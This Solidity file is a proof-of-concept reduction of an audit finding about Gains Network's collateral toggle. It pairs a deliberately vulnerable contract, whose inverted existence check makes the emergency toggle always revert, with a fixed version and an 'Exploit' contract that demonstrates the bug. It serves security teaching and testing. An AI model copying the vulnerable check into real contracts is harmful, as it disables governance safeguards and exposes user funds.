// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Gains Network — toggleCollateralActiveState reverts for every live collateral (Pashov, finding #37795)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: the emergency toggle treats precision > 0 as "does not exist". Precision is set
    when the collateral is added, so governance can never clear isActive, and openTrade still
    accepts the collateral. Vulnerable line preserved verbatim below (@> VULN). */

contract Collat {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract TradingStorage {
    error DoesntExist();

    struct Collateral {
        uint256 precision;
        bool isActive;
    }

    Collat public token;
    mapping(uint8 => Collateral) public collaterals;
    uint256 public openCollateral;

    constructor(Collat _token) {
        token = _token;
    }

    function addCollateral(uint8 index, uint256 precision) external {
        collaterals[index] = Collateral({precision: precision, isActive: true});
    }

    function toggleCollateralActiveState(uint8 _collateralIndex) external {
        Collateral storage collateral = collaterals[_collateralIndex];
        // @> VULN: precision is > 0 for every collateral that was added, so the toggle always reverts
        if (collateral.precision > 0) revert DoesntExist();
        bool toggled = !collateral.isActive;
        collateral.isActive = toggled;
    }

    function openTrade(uint8 index, uint256 amount) external {
        Collateral storage collateral = collaterals[index];
        require(collateral.isActive, "inactive");
        token.transferFrom(msg.sender, address(this), amount);
        openCollateral += amount;
    }
}

contract TradingStorageFixed {
    error DoesntExist();

    struct Collateral {
        uint256 precision;
        bool isActive;
    }

    Collat public token;
    mapping(uint8 => Collateral) public collaterals;
    uint256 public openCollateral;

    constructor(Collat _token) {
        token = _token;
    }

    function addCollateral(uint8 index, uint256 precision) external {
        collaterals[index] = Collateral({precision: precision, isActive: true});
    }

    function toggleCollateralActiveState(uint8 _collateralIndex) external {
        Collateral storage collateral = collaterals[_collateralIndex];
        if (collateral.precision == 0) revert DoesntExist();
        bool toggled = !collateral.isActive;
        collateral.isActive = toggled;
    }

    function openTrade(uint8 index, uint256 amount) external {
        Collateral storage collateral = collaterals[index];
        require(collateral.isActive, "inactive");
        token.transferFrom(msg.sender, address(this), amount);
        openCollateral += amount;
    }
}

contract Exploit {
    Collat public token; // CREATE nonce 1
    TradingStorage public trading; // CREATE nonce 2
    bool public toggleReverted;
    uint256 public opened;

    constructor() {
        token = new Collat();
        trading = new TradingStorage(token);
    }

    function run() external {
        trading.addCollateral(1, 1e18);
        try trading.toggleCollateralActiveState(1) {
            toggleReverted = false;
        } catch {
            toggleReverted = true;
        }
        require(toggleReverted, "toggle should revert");
        (uint256 precision, bool active) = trading.collaterals(1);
        require(precision == 1e18, "precision");
        require(active, "still active");
        token.mint(address(this), 1000 ether);
        token.approve(address(trading), 1000 ether);
        trading.openTrade(1, 1000 ether);
        opened = trading.openCollateral();
        require(opened == 1000 ether, "trade opened");
        require(token.balanceOf(address(trading)) == 1000 ether, "vault holds collateral");
    }
}
